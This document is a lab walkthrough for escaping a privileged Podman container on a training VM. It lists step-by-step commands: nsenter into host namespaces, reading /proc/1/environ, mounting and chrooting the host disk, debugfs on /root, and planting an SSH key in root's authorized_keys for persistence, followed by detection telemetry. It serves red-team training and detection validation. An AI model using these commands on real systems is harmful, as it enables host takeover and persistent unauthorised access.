# WT#048 — Podman Container Escape

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.40 (linux01) |
| **Domain** | cadre.local |
| **Starting Credential** | Local user access on linux01 |
| **Tools Required** | podman, unshare, nsenter |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1611, T1569 |
| **Difficulty** | Hard |

## Prerequisites
- Local shell access on linux01
- `cadre-monitor` container running with `--privileged --pid=host`

## Attack Steps

### 1. Enumerate running containers
```bash
sudo podman ps
sudo podman inspect cadre-monitor
```

### 2. Execute commands inside privileged container
```bash
sudo podman exec -it cadre-monitor bash
```

### 3. Escape via --privileged --pid=host
From inside the container:
```bash
# Since --pid=host, we can see host processes
cat /proc/1/environ

# Use nsenter to enter the host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Or use unshare
unshare -r id
```

### 4. Alternative escape: mount host filesystem
From inside the container:
```bash
# Mount the host root filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Or use debugfs
debugfs -R 'ls -la /root' /dev/sda1
```

### 5. Write cron job or SSH key for persistence
```bash
echo '<PUBLIC_KEY>' >> /root/.ssh/authorized_keys
```

## Post-Exploitation Chain
Container access → --privileged + --pid=host → nsenter/unshare → Root namespace escape → Full host root (linux01)

## Telemetry Verification
- **auditd key `container_escape`**: `nsenter` or `unshare` syscall from container PID
- **Event 4688 (if sysmon-for-linux)**: Container breakout process chain
- **Podman events** (`podman events --stream`): Container exec operations

## Status
CONFIGURED
